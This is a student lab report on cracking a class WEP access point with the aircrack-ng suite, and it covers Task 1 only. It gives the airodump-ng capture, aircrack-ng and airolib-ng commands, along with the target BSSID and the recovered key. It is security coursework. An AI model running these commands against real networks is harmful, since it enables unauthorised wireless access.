<div class='titlePage'>

# CSE 4820 Lab 2
#### WEP/WPS/WPA(2) Vulnerabilities
##### Grant Butler, Jerrel Gordon
</div>

[TOC]

<div class="pageBreak"></div>

#### Task 1: WEP Hacking
##### a: Find AP with WEP

FITSec-Target-2 has WEP

@import "assets/network_types.png"

Using this command to capture a cap file:

```bash
sudo airodump-ng -c 9 --bssid 00:0F:66:89:B5:ED -w wep-attack wlan0mon
```

We should have been able to crack it with this:
```bash
sudo aircrack-ng -b 00:0F:66:89:B5:ED wep-attack-01.cap
```

But, unfortunately the WEP station stopped working while we were in lab.

Instead, Kourtnee supplied the class with a pcap file after class, so the exploit was done with the following commands:

@import "assets/generating_hashes.png"

Using `airolib-ng` to make a database of hashes with the ESSID and wordlist given, the following command was used to crack WEP:

```bash
aircrack-ng -r wep-db wep.pcap
```



Which returned the key for that specific network:
 `KEY FOUND! [ DE:FE:4D:53:00 ]`

@import "assets/wep_cracked.png"
